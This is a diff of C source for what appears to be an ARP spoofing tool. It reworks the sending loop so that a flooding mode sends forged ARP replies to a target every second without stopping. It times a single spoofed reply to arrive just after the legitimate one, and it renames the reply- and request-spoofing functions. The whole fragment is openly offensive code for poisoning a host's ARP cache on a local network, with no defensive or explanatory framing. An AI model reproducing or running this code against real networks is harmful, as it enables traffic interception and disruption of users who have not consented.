@@ -143,22 +143,26 @@ int	handle_request(char *buff, int packet_socket, int interface_index) {
 
 	// Sleep for a short time to let the legitimate ARP reply arive before our spoofed unsolicited reply.
 	// This will only work if the target system accepts unsolicited ARP replies.
-	sleep(2);
+	if (args.attack_type == REPLY_SPOOFING)
+		sleep(2);
 
-	for (int i = 0; i < 1; args.attack_type != REPLY_FLOODING ? i++ : 1) {
-		printf("Sending an ARP reply to the target...\n");
+	while (1) {
 		if (sendto(packet_socket, &reply, sizeof(reply), 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
 			puts( strerror( errno ) );
 			return (1);
 		}
-		if (args.attack_type == REPLY_FLOODING)
-			sleep(1);
+		printf("Sent an ARP reply to the target...\n");
+
+		if (args.attack_type != REPLY_FLOODING)
+			break ;
+
+		sleep(1);
 	}
 
 	return (0);
 }
 
-int	run_arp_spoofing(int interface_index) {
+int	arp_reply_spoof(int interface_index) {
 
 	int					packet_socket, recvd;
 	char				buff[ETH_ZLEN];
@@ -229,7 +233,7 @@ void	craft_arp_request(t_ArpPacket *request) {
 	memcpy(request->tpa, args.tar_ip, request->pln);
 }
 
-int		run_arp_spoofing_type_2(int interface_index) {
+int		arp_request_spoof(int interface_index) {
 	int					packet_socket;
 	struct sockaddr_ll	addr;
 	t_ArpPacket			request;
@@ -252,7 +256,7 @@ int		run_arp_spoofing_type_2(int interface_index) {
 	addr.sll_halen = request.hln;
 	memcpy(addr.sll_addr, request.dest, ETHER_ADDR_LEN);
 
-	printf("Sending an ARP request to restore the network...\n");
+	printf("Sending an ARP request to the target...\n");
 
 	if (sendto(packet_socket, &request, sizeof(request), 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
 		puts( strerror( errno ) );
